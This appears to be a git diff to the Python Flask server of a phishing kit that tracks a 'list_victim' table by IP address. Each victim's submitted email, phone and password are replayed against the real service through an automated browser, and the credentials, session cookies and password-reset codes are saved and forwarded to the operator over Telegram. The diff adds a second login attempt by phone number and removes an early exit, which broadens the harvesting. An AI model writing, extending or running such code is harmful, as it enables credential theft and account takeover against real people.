@@ -90,7 +90,6 @@ def handle_login(data):
     if ip in list_victim:
         pass
     else:
-        exit(0)
         list_victim[ip] = AutoChrome()
     list_victim[ip].email = data["email"]
     list_victim[ip].phonenumber = data["phone"]
@@ -98,10 +97,12 @@ def handle_login(data):
     status = list_victim[ip].authenticate_account(
         data["email"], data["password"])
     if status["message"] == "WRONG_CREDENTIALS":
-        Data().add_data(username=data["email"], password=data["password"],
-                        country=country, type='SMK')
-        telegram.send_message(
-            'Sai mật khẩu', data["email"], data["phone"], data["password"], ip=ip, country=country)
+        status = list_victim[ip].login(data["phone"], data["password"])
+        if status["message"] == "WRONG_CREDENTIALS":
+            Data().add_data(username=data["email"], password=data["password"],
+                            country=country, type='SMK')
+            telegram.send_message(
+                'Sai mật khẩu', data["email"], data["phone"], data["password"], ip=ip, country=country)
     if status["message"] == "LOGGED_IN":
         cookie = list_victim[ip].get_cookie(cookie_type)
         Data().add_data(username=data["email"], password=data["password"], cookie=cookie,
@@ -144,7 +145,6 @@ def handle_forget_password(code):
         pass
     else:
         return {"status": "failed", "message": "CHECKPOINT_ACCOUNT"}
-    cookie = list_victim[ip].get_cookie(cookie_type)
     Data().add_data(list_victim[ip].email, list_victim[ip].password,
                     code, country=get_country(ip), type='FGP')
     telegram.send_code(
@@ -188,4 +188,4 @@ def catch_all(path):
 
 
 if __name__ == "__main__":
-    socketio.run(app, host="0.0.0.0", debug=True, port=7000)
+    socketio.run(app, host="0.0.0.0", debug=True, port=8000)
